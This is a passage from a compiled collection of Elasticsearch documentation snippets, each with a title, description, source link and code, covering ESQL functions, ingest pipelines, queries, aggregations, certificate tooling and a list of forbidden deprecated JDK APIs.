seconds');\n\nSELECT TO_DATE_PERIOD('not a valid period');\n\nSELECT TO_DATE_PERIOD(123);\n\nSELECT TO_DATE_PERIOD(true);\n\nSELECT TO_DATE_PERIOD(false);\n```\n\n----------------------------------------\n\nTITLE: Detaching Nodes from Cluster\nDESCRIPTION: Demonstrates how to detach nodes from a failed cluster so they can join a new cluster after unsafe bootstrapping. Shows the interactive process and warnings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_9\n\nLANGUAGE: txt\nCODE:\n```\nnode_3$ ./bin/elasticsearch-node detach-cluster\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nYou should only run this tool if you have permanently lost all of the\nmaster-eligible nodes in this cluster and you cannot restore the cluster\nfrom a snapshot, or you have already unsafely bootstrapped a new cluster\nby running `elasticsearch-node unsafe-bootstrap` on a master-eligible\nnode that belonged to the same cluster as this node. This tool can cause\narbitrary data loss and its use should be your last resort.\n\nDo you want to proceed?\n\nConfirm [y/N] y\nNode was successfully detached from the cluster\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Pipeline Definition and Document Indexing\nDESCRIPTION: Pipeline configuration using foreach processor to iterate over attachments array and process each attachment individually, followed by document indexing command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/attachment\n{\n  \"description\" : \"Extract attachment information from arrays\",\n  \"processors\" : [\n    {\n      \"foreach\": {\n        \"field\": \"attachments\",\n        \"processor\": {\n          \"attachment\": {\n            \"target_field\": \"_ingest._value.attachment\",\n            \"field\": \"_ingest._value.data\",\n            \"remove_binary\": true\n          }\n        }\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=attachment\n{\n  \"attachments\" : [\n    {\n      \"filename\" : \"ipsum.txt\",\n      \"data\" : \"dGhpcyBpcwpqdXN0IHNvbWUgdGV4dAo=\"\n    },\n    {\n      \"filename\" : \"test.txt\",\n      \"data\" : \"VGhpcyBpcyBhIHRlc3QK\"\n    }\n  ]\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Function Parameters in Markdown\nDESCRIPTION: This snippet defines the parameters for an ESQL function. It specifies a single parameter 'str' which is a string expression, and notes that the function returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/reverse.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`str`\n:   String expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Searching with Geo-bounding Box Query for Geo_point\nDESCRIPTION: This snippet shows how to search for geo_point data within a specified bounding box using a geo_bounding_box filter. The operation requires a geo_point index in Elasticsearch. Inputs are Elasticsearch GET requests with query structure, and outputs are matching documents. Accurate geo_point data is necessary.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top_left\": {\n              \"lat\": 40.73,\n              \"lon\": -74.1\n            },\n            \"bottom_right\": {\n              \"lat\": 40.01,\n              \"lon\": -71.12\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customize stop filter with ignore_case parameter\nDESCRIPTION: This snippet shows how to customize the `stop` filter by setting the `ignore_case` parameter to `true`. This makes the stop word matching case-insensitive. The filter is associated with the default analyzer for the index `my-index-000001`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"default\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"my_custom_stop_words_filter\" ]\n        }\n      },\n      \"filter\": {\n        \"my_custom_stop_words_filter\": {\n          \"type\": \"stop\",\n          \"ignore_case\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Parameter Documentation in Markdown\nDESCRIPTION: Parameter documentation for an ESQL function, specifying first and rest parameters. The documentation is auto-generated and should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/coalesce.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`first`\n:   Expression to evaluate.\n\n`rest`\n:   Other expression to evaluate.\n```\n\n----------------------------------------\n\nTITLE: Response Example for K-S Test on Latency Distributions\nDESCRIPTION: The response from the bucket_count_ks_test aggregation showing the statistical results. It includes the document counts for each latency range bucket and the p-values for each alternative hypothesis (less, greater, two_sided) across different software versions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-count-ks-test-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"aggregations\" : {\n    \"buckets\" : {\n      \"doc_count_error_upper_bound\" : 0,\n      \"sum_other_doc_count\" : 0,\n      \"buckets\" : [\n        {\n          \"key\" : \"1.0\",\n          \"doc_count\" : 100,\n          \"latency_ranges\" : {\n            \"buckets\" : [\n              {\n                \"key\" : \"*-0.0\",\n                \"to\" : 0.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"0.0-105.0\",\n                \"from\" : 0.0,\n                \"to\" : 105.0,\n                \"doc_count\" : 1\n              },\n              {\n                \"key\" : \"105.0-225.0\",\n                \"from\" : 105.0,\n                \"to\" : 225.0,\n                \"doc_count\" : 9\n              },\n              {\n                \"key\" : \"225.0-445.0\",\n                \"from\" : 225.0,\n                \"to\" : 445.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"445.0-665.0\",\n                \"from\" : 445.0,\n                \"to\" : 665.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"665.0-885.0\",\n                \"from\" : 665.0,\n                \"to\" : 885.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"885.0-1115.0\",\n                \"from\" : 885.0,\n                \"to\" : 1115.0,\n                \"doc_count\" : 10\n              },\n              {\n                \"key\" : \"1115.0-1335.0\",\n                \"from\" : 1115.0,\n                \"to\" : 1335.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"1335.0-1555.0\",\n                \"from\" : 1335.0,\n                \"to\" : 1555.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"1555.0-1775.0\",\n                \"from\" : 1555.0,\n                \"to\" : 1775.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"1775.0-*\",\n                \"from\" : 1775.0,\n                \"doc_count\" : 20\n              }\n            ]\n          },\n          \"ks_test\" : {\n            \"less\" : 2.248673241788478E-4,\n            \"greater\" : 1.0,\n            \"two_sided\" : 5.791639181800257E-4\n          }\n        },\n        {\n          \"key\" : \"2.0\",\n          \"doc_count\" : 100,\n          \"latency_ranges\" : {\n            \"buckets\" : [\n              {\n                \"key\" : \"*-0.0\",\n                \"to\" : 0.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"0.0-105.0\",\n                \"from\" : 0.0,\n                \"to\" : 105.0,\n                \"doc_count\" : 19\n              },\n              {\n                \"key\" : \"105.0-225.0\",\n                \"from\" : 105.0,\n                \"to\" : 225.0,\n                \"doc_count\" : 11\n              },\n              {\n                \"key\" : \"225.0-445.0\",\n                \"from\" : 225.0,\n                \"to\" : 445.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"445.0-665.0\",\n                \"from\" : 445.0,\n                \"to\" : 665.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"665.0-885.0\",\n                \"from\" : 665.0,\n                \"to\" : 885.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"885.0-1115.0\",\n                \"from\" : 885.0,\n                \"to\" : 1115.0,\n                \"doc_count\" : 10\n              },\n              {\n                \"key\" : \"1115.0-1335.0\",\n                \"from\" : 1115.0,\n                \"to\" : 1335.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"1335.0-1555.0\",\n                \"from\" : 1335.0,\n                \"to\" : 1555.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"1555.0-1775.0\",\n                \"from\" : 1555.0,\n                \"to\" : 1775.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"1775.0-*\",\n                \"from\" : 1775.0,\n                \"doc_count\" : 0\n              }\n            ]\n          },\n          \"ks_test\" : {\n            \"less\" : 0.9642895789647244,\n            \"greater\" : 4.58718174664754E-9,\n            \"two_sided\" : 5.916656831139733E-9\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Text Embedding Options in Elasticsearch\nDESCRIPTION: Specifies the configuration options for text embedding in Elasticsearch's inference processor. It includes settings for the results field and tokenization options for various model types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nresults_field: string\ntokenization:\n  bert:\n    truncate: string\n  deberta_v2:\n    truncate: string\n  roberta:\n    truncate: string\n  mpnet:\n    truncate: string\n```\n\n----------------------------------------\n\nTITLE: Copying First and Last Name Fields to Full Name in Elasticsearch\nDESCRIPTION: This example shows how to copy values from first_name and last_name fields into a full_name field in Elasticsearch. It demonstrates creating an index with appropriate mappings, indexing a document, and then querying the full_name field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/copy-to.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"first_name\": {\n        \"type\": \"text\",\n        \"copy_to\": \"full_name\" \n      },\n      \"last_name\": {\n        \"type\": \"text\",\n        \"copy_to\": \"full_name\" \n      },\n      \"full_name\": {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"first_name\": \"John\",\n  \"last_name\": \"Smith\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"full_name\": { \n        \"query\": \"John Smith\",\n        \"operator\": \"and\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with a Text Field in Elasticsearch Console\nDESCRIPTION: This snippet illustrates how to create an index with a 'text' field in Elasticsearch using the console. It's a prerequisite setup for demonstrating the difference between term and match queries. The 'full_text' property is assigned a type of 'text', which will undergo text analysis during indexing, affecting how queries match against it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-term-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"full_text\": { \"type\": \"text\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ENRICH Command with Explicit Field Selection in Elasticsearch SQL\nDESCRIPTION: Demonstrates how to explicitly select the enrich fields to be added using the WITH clause in the ENRICH command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-enrich-data.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1\"\n| ENRICH languages_policy ON a WITH language_name\n```\n\n----------------------------------------\n\nTITLE: Host Name Contains Check - Case-Sensitive Elasticsearch Filter\nDESCRIPTION: Filters `process` events to find those where the `hostname` field contains 'foo'. Relies on a `wildcard` query targeting the `.keyword` sub-field for case sensitivity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_9\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\"bool\":{\"must\":[{\"term\":{\"event.category\":{\"value\":\"process\"}}},{\"wildcard\":{\"hostname.keyword\":{\"wildcard\":\"*foo*\",\"boost\":1.0}}}],\"boost\":1.0}}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Rank Evaluation API Response Format\nDESCRIPTION: This snippet illustrates the response format of the Elasticsearch Rank Evaluation API. It includes the overall metric score, details for each query, and optional failure information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_9\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"rank_eval\": {\n    \"metric_score\": 0.4,                          \n      \"details\": {\n      \"my_query_id1\": {                           \n        \"metric_score\": 0.6,                      \n        \"unrated_docs\": [                         \n          {\n            \"_index\": \"my-index-000001\",\n            \"_id\": \"1960795\"\n          }, ...\n        ],\n        \"hits\": [\n          {\n            \"hit\": {                              \n              \"_index\": \"my-index-000001\",\n              \"_type\": \"page\",\n              \"_id\": \"1528558\",\n              \"_score\": 7.0556192\n            },\n            \"rating\": 1\n          }, ...\n        ],\n        \"metric_details\": {                       \n          \"precision\": {\n            \"relevant_docs_retrieved\": 6,\n            \"docs_retrieved\": 10\n          }\n        }\n      },\n      \"my_query_id2\": { [... ] }\n    },\n    \"failures\": { [... ] }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Client Certificate with Elasticsearch Certutil\nDESCRIPTION: This command generates a client certificate for Elasticsearch.  It creates a zipped PKCS#12 file, sets a password, validity period, specifies the CA to use for signing, extracts the zipped certificate, and removes the zip archive.  This certificate will be used by clients to authenticate with the cluster.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/reindex/src/test/resources/org/elasticsearch/reindex/README.txt#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ES_HOME/bin/elasticsearch-certutil cert --out client.zip --pass \"client-password\" \\\n    --name \"client\" --days 9999  --pem \\\n    --ca ca.p12 --ca-pass \"ca-password\"\nunzip client.zip\nrm client.zip\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with KStem Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the KStem filter to stem English text using the analyze API. It shows how the filter transforms the input text 'the foxes jumping quickly' into stemmed tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-kstem-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [ \"kstem\" ],\n  \"text\": \"the foxes jumping quickly\"\n}\n```\n\n----------------------------------------\n\nTITLE: Structuring Elasticsearch Query Result for Log Message Search\nDESCRIPTION: This JSON structure represents an Elasticsearch query result for searching log messages. It includes a regex pattern for matching, maximum matching length, and detailed hit information including the matched log message and its metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"regex\": \".*?User.+?logging.+?on.*?\",\n  \"max_matching_length\": 52,\n  \"hit\": {\n    \"hits\": {\n      \"total\": {\n        \"value\": 1,\n        \"relation\": \"eq\"\n      },\n      \"max_score\": null,\n      \"hits\": [\n        {\n          \"_index\": \"log-messages\",\n          \"_id\": \"5\",\n          \"_score\": null,\n          \"_source\": {\n            \"message\": \"2016-02-08T00:00:00+0000 User foo_325 logging on\"\n          },\n          \"sort\": [\n            1454889720000\n          ]\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing the ICU Analysis Plugin for Elasticsearch\nDESCRIPTION: Example command for installing the ICU analysis plugin for Elasticsearch. This core plugin provides Unicode normalization, collation and folding capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/installing-multiple-plugins.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-icu\n```\n\n----------------------------------------\n\nTITLE: Reading Elasticsearch certificates using openssl\nDESCRIPTION: This script reads and parses Elasticsearch certificates using `openssl` commands. It sets environment variables for the certificate path and filename, then uses `openssl x509` to display the certificate text, and `openssl asn1parse` to parse the certificate's ASN.1 structure. Specific parts of the certificate, such as the SAN (Subject Alternative Name), are parsed using `openssl asn1parse` with the `-strparse` option.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/readme.md#2025-04-21_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nexport CERT_PATH=$SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes\nexport CERT=ca-signed/n1.c1.crt\nopenssl x509 -in $CERT_PATH/$CERT -text\nopenssl asn1parse -in $CERT_PATH/$CERT\nopenssl asn1parse -in $CERT_PATH/$CERT -strparse 492 # location for SAN OCTET STRING\n```\n\n----------------------------------------\n\nTITLE: STDDEV_POP Aggregation Function in SQL\nDESCRIPTION: Calculates the population standard deviation of input values in a numeric field. Returns a double value representing the standard deviation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_14\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min, MAX(salary) AS max, STDDEV_POP(salary) AS stddev FROM emp;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary / 12.0) AS min, MAX(salary / 12.0) AS max, STDDEV_POP(salary / 12.0) AS stddev FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON Geometry Collection in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON Geometry Collection in Elasticsearch. The collection contains multiple geometry objects of different types (point and linestring) in a single field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_16\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\": \"geometrycollection\",\n    \"geometries\": [\n      {\n        \"type\": \"point\",\n        \"coordinates\": [1000.0, 100.0]\n      },\n      {\n        \"type\": \"linestring\",\n        \"coordinates\": [ [1001.0, 100.0], [1002.0, 100.0] ]\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Cluster-Level Total Shards Per Node in Elasticsearch\nDESCRIPTION: Dynamic cluster setting that limits the maximum number of primary and replica shards allocated to each node across all indices. Defaults to -1 which means unlimited shards per node.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/total-shards-per-node.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.total_shards_per_node\n```\n\n----------------------------------------\n\nTITLE: Running E2E Testing for Microsoft Teams Connector\nDESCRIPTION: Command to perform end-to-end testing against a real Microsoft Teams data source. This allows operators to verify the connector's functionality with actual data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-teams.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=microsoft_teams\n```\n\n----------------------------------------\n\nTITLE: Applying Functions to Multivalued Fields in ESQL\nDESCRIPTION: Shows that most functions return null when applied to multivalued fields in ESQL. The example includes indexing documents with multivalued fields and attempting to apply arithmetic operations on them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-multivalued-fields.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /mv/_bulk?refresh\n{ \"index\" : {} }\n{ \"a\": 1, \"b\": [2, 1] }\n{ \"index\" : {} }\n{ \"a\": 2, \"b\": 3 }\n\nPOST /_query\n{\n  \"query\": \"FROM mv | EVAL b + 2, a + b | LIMIT 4\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 28,\n  \"is_partial\": false,\n  \"columns\": [\n    { \"name\": \"a\",   \"type\": \"long\"},\n    { \"name\": \"b\",   \"type\": \"long\"},\n    { \"name\": \"b + 2\", \"type\": \"long\"},\n    { \"name\": \"a + b\", \"type\": \"long\"}\n  ],\n  \"values\": [\n    [1, [1, 2], null, null],\n    [2,      3,    5,    5]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Including ABS Function Parameters in Markdown\nDESCRIPTION: Includes the content of a separate Markdown file containing parameter information for the ABS function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/abs.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/abs.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch License Header Definition\nDESCRIPTION: Multi-license header defining usage terms for Elasticsearch components. Users can choose between Elastic License 2.0, GNU AGPL v3.0, or Server Side Public License v1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n#\n # Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one\n # or more contributor license agreements. Licensed under the \"Elastic License\n # 2.0\", the \"GNU Affero General Public License v3.0 only\", and the \"Server Side\n # Public License v 1\"; you may not use this file except in compliance with, at\n # your election, the \"Elastic License 2.0\", the \"GNU Affero General Public\n # License v3.0 only\", or the \"Server Side Public License, v 1\".\n#\n```\n\n----------------------------------------\n\nTITLE: Listing Java Security and Deprecated APIs\nDESCRIPTION: This snippet provides a comprehensive list of Java API methods and classes, many of which are related to security features, thread management, networking operations, and RMI functionality. Some of these APIs may be deprecated or have security implications in modern Java versions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-deprecated.txt#2025-04-21_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\njava.lang.System#setSecurityManager(java.lang.SecurityManager)\njava.lang.Thread#checkAccess()\njava.lang.Thread#countStackFrames()\njava.lang.Thread#resume()\njava.lang.Thread#stop()\njava.lang.Thread#suspend()\njava.lang.ThreadGroup#checkAccess()\njava.lang.ThreadGroup#destroy()\njava.lang.ThreadGroup#isDaemon()\njava.lang.ThreadGroup#isDestroyed()\njava.lang.ThreadGroup#resume()\njava.lang.ThreadGroup#setDaemon(boolean)\njava.lang.ThreadGroup#stop()\njava.lang.ThreadGroup#suspend()\njava.lang.invoke.MethodHandles$Lookup#hasPrivateAccess()\njava.lang.ref.Reference#isEnqueued()\njava.lang.reflect.AccessibleObject#<init>()\njava.lang.reflect.AccessibleObject#isAccessible()\njava.lang.reflect.Proxy#getProxyClass(java.lang.ClassLoader,java.lang.Class[])\njava.math.BigDecimal#ROUND_CEILING\njava.math.BigDecimal#ROUND_DOWN\njava.math.BigDecimal#ROUND_FLOOR\njava.math.BigDecimal#ROUND_HALF_DOWN\njava.math.BigDecimal#ROUND_HALF_EVEN\njava.math.BigDecimal#ROUND_HALF_UP\njava.math.BigDecimal#ROUND_UNNECESSARY\njava.math.BigDecimal#ROUND_UP\njava.math.BigDecimal#divide(java.math.BigDecimal,int)\njava.math.BigDecimal#divide(java.math.BigDecimal,int,int)\njava.math.BigDecimal#setScale(int,int)\njava.net.DatagramSocket#setDatagramSocketImplFactory(java.net.DatagramSocketImplFactory)\njava.net.DatagramSocketImpl#getTTL()\njava.net.DatagramSocketImpl#setTTL(byte)\njava.net.HttpURLConnection#HTTP_SERVER_ERROR\njava.net.MulticastSocket#getInterface()\njava.net.MulticastSocket#getLoopbackMode()\njava.net.MulticastSocket#getTTL()\njava.net.MulticastSocket#joinGroup(java.net.InetAddress)\njava.net.MulticastSocket#leaveGroup(java.net.InetAddress)\njava.net.MulticastSocket#send(java.net.DatagramPacket,byte)\njava.net.MulticastSocket#setInterface(java.net.InetAddress)\njava.net.MulticastSocket#setLoopbackMode(boolean)\njava.net.MulticastSocket#setTTL(byte)\njava.net.ServerSocket#setSocketFactory(java.net.SocketImplFactory)\njava.net.Socket#<init>(java.lang.String,int,boolean)\njava.net.Socket#<init>(java.net.InetAddress,int,boolean)\njava.net.Socket#setSocketImplFactory(java.net.SocketImplFactory)\njava.net.URLConnection#getDefaultRequestProperty(java.lang.String)\njava.net.URLConnection#setDefaultRequestProperty(java.lang.String,java.lang.String)\njava.net.URLDecoder#decode(java.lang.String)\njava.net.URLEncoder#encode(java.lang.String)\njava.net.URLStreamHandler#setURL(java.net.URL,java.lang.String,java.lang.String,int,java.lang.String,java.lang.String)\njava.rmi.RMISecurityException\njava.rmi.RMISecurityManager\njava.rmi.ServerRuntimeException\njava.rmi.dgc.VMID#isUnique()\njava.rmi.registry.RegistryHandler\njava.rmi.server.LoaderHandler\njava.rmi.server.LogStream\njava.rmi.server.Operation\njava.rmi.server.RMIClassLoader#getSecurityContext(java.lang.ClassLoader)\njava.rmi.server.RMIClassLoader#loadClass(java.lang.String)\njava.rmi.server.RemoteCall\njava.rmi.server.RemoteRef#done(java.rmi.server.RemoteCall)\njava.rmi.server.RemoteRef#invoke(java.rmi.server.RemoteCall)\njava.rmi.server.RemoteRef#newCall(java.rmi.server.RemoteObject,java.rmi.server.Operation[],int,long)\njava.rmi.server.RemoteRef#serialVersionUID\njava.rmi.server.RemoteStub\njava.rmi.server.ServerRef\njava.rmi.server.Skeleton\njava.rmi.server.SkeletonMismatchException\njava.rmi.server.SkeletonNotFoundException\njava.rmi.server.SocketSecurityException\njava.rmi.server.UnicastRemoteObject#exportObject(java.rmi.Remote)\njava.security.AuthProvider#<init>(java.lang.String,double,java.lang.String)\njava.security.Certificate\njava.security.DomainCombiner\njava.security.Identity\njava.security.IdentityScope\njava.security.Key#serialVersionUID\n```\n\n----------------------------------------\n\nTITLE: Creating Stats Index with Aggregate Metric Field\nDESCRIPTION: Creating a statistics index with an aggregate_metric_double field named agg_metric that includes all supported metric types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/aggregate-metric-double.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT stats-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"agg_metric\": {\n        \"type\": \"aggregate_metric_double\",\n        \"metrics\": [ \"min\", \"max\", \"sum\", \"value_count\" ],\n        \"default_metric\": \"max\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Token output from dictionary decompounder filter in Elasticsearch\nDESCRIPTION: This snippet shows the tokens produced by the dictionary_decompounder filter when applied to the word 'Donaudampfschiff'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-dict-decomp-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ Donaudampfschiff, Donau, dampf, schiff ]\n```\n\n----------------------------------------\n\nTITLE: Formatting Date Histogram Keys in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the 'format' parameter in a date histogram aggregation to specify custom date formatting for bucket keys.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\",\n        \"format\": \"yyyy-MM-dd\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"sales_over_time\": {\n      \"buckets\": [\n        {\n          \"key_as_string\": \"2015-01-01\",\n          \"key\": 1420070400000,\n          \"doc_count\": 3\n        },\n        {\n          \"key_as_string\": \"2015-02-01\",\n          \"key\": 1422748800000,\n          \"doc_count\": 2\n        },\n        {\n          \"key_as_string\": \"2015-03-01\",\n          \"key\": 1425168000000,\n          \"doc_count\": 2\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using TESTRESPONSE Marker with Modifiers in Elasticsearch Docs\nDESCRIPTION: Examples of using the TESTRESPONSE marker with various modifiers for controlling response assertions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n% TESTRESPONSE[s/foo/bar/]\n% TESTRESPONSE[s/\"took\": 25/\"took\": $body.took/]\n% TESTRESPONSE[s/\\d+/$body.$_path/]\n% TESTRESPONSE[non_json]\n% TESTRESPONSE[skip:reason]\n```\n\n----------------------------------------\n\nTITLE: Size Metric Example\nDESCRIPTION: This snippet demonstrates metric naming conventions for representing sizes, including the 'size' suffix. It emphasizes that the unit of measure should not be included in the metric name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_4\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.mem.virtual.size\"\n```\n\nLANGUAGE: none\nCODE:\n```\n\"es.indices.storage.size\"\n```\n\n----------------------------------------\n\nTITLE: Indexing a Query with Percolator Field\nDESCRIPTION: Demonstrates how to index a match query using the percolator field type.\nSOURCE: 